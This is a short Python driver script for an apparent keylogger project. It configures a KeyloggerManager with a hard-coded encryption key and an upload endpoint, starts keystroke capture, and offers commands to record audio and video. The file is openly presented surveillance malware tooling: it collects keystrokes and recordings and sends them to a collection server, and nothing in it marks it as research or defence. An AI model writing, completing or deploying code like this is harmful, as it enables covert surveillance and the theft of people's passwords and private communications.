from keylogger_manger import KeyloggerManager
# import time


def main():
    manager = KeyloggerManager(
        machine_name="MyMachine",
        flush_interval=60,
        encryption_key="my_secret_key",
        server_url="http://127.0.0.1:5000/api/upload"
    )
    manager.start()

    try:
        while True:
            command = input("\nCommands: [stop, audio, video]\n> ")
            if command.lower() == "stop":
                manager.stop()
                break
            elif command.lower() == "audio":
                manager.record_audio()
            elif command.lower() == "video":
                manager.record_video()
    except KeyboardInterrupt:
        manager.stop()


if __name__ == "__main__":
    main()
